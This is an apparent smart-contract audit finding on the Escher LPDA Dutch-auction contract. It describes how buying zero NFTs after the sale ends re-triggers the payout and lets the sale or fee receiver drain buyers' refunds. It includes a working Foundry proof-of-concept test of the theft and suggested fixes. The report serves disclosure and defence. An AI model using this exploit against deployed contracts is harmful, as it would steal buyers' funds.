## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- H-03

# [`saleReceiver` and `feeReceiver` can steal refunds after sale has ended](https://github.com/code-423n4/2022-12-escher-findings/issues/441) 

# Lines of code

https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L67-L68
https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L81-L88


# Vulnerability details

First, lets go over how a buy happens.

A buyer can buy NFTs at a higher price and then once the auction ends they can use `refund()` to return the over payments. The effect is that they bought the NFTs at the lowest price (Lowest Price Dutch Auction).

Now, let's move on to what happens when the sale ends:

The sale is considered ended when the last NFT is sold which triggers the payout to the seller and fee collector:

```javascript
81:        if (newId == temp.finalId) {
82:            sale.finalPrice = uint80(price);
83:            uint256 totalSale = price * amountSold;
84:            uint256 fee = totalSale / 20;
85:            ISaleFactory(factory).feeReceiver().transfer(fee);
86:            temp.saleReceiver.transfer(totalSale - fee);
87:            _end();
88:        }
```

Earlier there's also a check that you cannot continue buying once the `currentId` has reached `finalId`:

```javascript
67:        uint48 newId = amount + temp.currentId;
68:        require(newId <= temp.finalId, "TOO MANY");
```

However, it is still possible to buy `0` NFTs for whichever price you want even after the sale has ended. Triggering the "end of sale" snippet again, since `newId` will still equal `temp.finalId`.

The attacker, `saleReceiver` (or `feeReceiver`), buys `0` NFTs for the delta between `totalSale` and the balance still in the contract (the over payments by buyers). If there is more balance in the contract than `totalSales` this can be iterated until the contract is empty.

The attacker has then stolen the over payments from the buyers.

A buyer can mitigate this by continuously call `refund()` as the price lowers but that would incur a high gas cost.

## Impact
`saleReceiver` or `feeReceiver` can steal buyers over payments after the sale has ended. Who gains the most depends on circumstances in the auction.

## Proof of Concept

PoC test in `test/LPDA.t.sol`:
```javascript
    function test_BuyStealRefund() public {
        sale = LPDA(lpdaSales.createLPDASale(lpdaSale));
        edition.grantRole(edition.MINTER_ROLE(), address(sale));
        
        // buy most nfts at a higher price
        sale.buy{value: 9 ether}(9);

        // warp to when price is lowest
        vm.warp(block.timestamp + 1 days);
        uint256 price = sale.getPrice(); // 0.9 eth

        // buy last nft at lowest possible price
        sale.buy{value: price}(1);

        uint256 contractBalanceAfterEnd = address(sale).balance;
        uint256 receiverBalanceAfterEnd = address(69).balance;
        console.log("Sale end");
        console.log("LPDA contract",contractBalanceAfterEnd); // ~ 0.9 eth
        console.log("saleReceiver ",receiverBalanceAfterEnd); // ~9 - fee eth

        // buy 0 nfts for the totalSales price - current balance
        // totalSales: 9 eth - contract balance 0.9 eth = ~8.1 eth
        uint256 totalSale = price * 10;
        uint256 delta = totalSale - contractBalanceAfterEnd;
        sale.buy{value: delta}(0);

        console.log("after steal");
        console.log("LPDA contract",address(sale).balance);
        console.log("saleReceiver ",address(69).balance - receiverBalanceAfterEnd - delta); // ~0.45 eth stolen by receiver, 0.45 eth to fees

        // buyer supposed to get back the ~0.9 eth
        vm.expectRevert(); // EvmError: OutOfFund
        sale.refund(); // nothing to refund
    }
```

## Tools Used
vs code, forge

## Recommended Mitigation Steps
I can think of different options of how to mitigate this:
 - don't allow buying 0 NFTs
 - don't allow buying if `newId == finalId` since the sale has ended